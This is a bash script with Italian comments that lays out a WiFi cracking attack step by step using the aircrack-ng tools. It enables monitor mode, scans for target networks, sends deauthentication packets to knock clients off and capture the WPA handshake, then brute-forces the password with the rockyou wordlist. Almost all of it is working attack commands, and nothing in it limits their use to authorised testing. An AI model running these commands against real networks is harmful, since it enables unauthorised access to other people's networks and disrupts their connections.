#!/bin/bash

################################################################################
# Script per l'attacco bruteforce WiFi                                        #
# Contiene i comandi principali con le relative descrizioni/commenti.          #
#Si presuppone che tutte le suite utilizzate siano già installate correttamente.#
################################################################################

# 1)Abilitatiamo la modalità monitor della nostra antenna WIFI esterna
#lanciamo quindi il comando
sudo airmon-ng start wlan0
#questo  ci permtterà di monitorare le reti wifi nelle vicinanze.

# 2) Scansiona le reti wireless vicine
#    Raccoglie i beacon e mostra BSSID, ESSID, canali e client associati.
sudo airodump-ng wlan0
#da questo comando otterremo una lista delle reti wifi nelle vicinanze
#da cui dobbiamo salvare il suo BSSID e il canale su cui opera.

#2.1)lanciamo il comando dopo aver annotato il BSSID e il canale della rete
sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w capture wlan0

# 3) Esegui un attacco di deauth per forzare la disconnessione dei   #
#    client e catturare l'handshake
#    --deauth 10: invia 10 pacchetti di disconnessione
#    -a <BSSID>: indirizzo MAC del router target
#    -c <STATION>: indirizzo MAC del client target
sudo aireplay-ng --deauth 10 -a <BSSID>  -c <STATION>

#nel caso in cui l'attacco sia andato a buon fine nel terminale 
#dovremmo vedere un messaggio che indica che l'handshake è stato catturato.
#salviamo quindi in un file la cattura

# 5) Avvia il brute-force sulla cattura usando una wordlist
#    -w rockyou.txt: specifica il percorso della lista di password
#    sniffraw_0.pcap: file di cattura contenente l'handshake
sudo aircrack-ng -w rockyou.txt sniffraw_0.pcap
#se la password è presente nella wordlist, il programma la troverà e la stamperà a video.

#per una migliore lettura delle informazioni catturate è consigliato usare wireshark
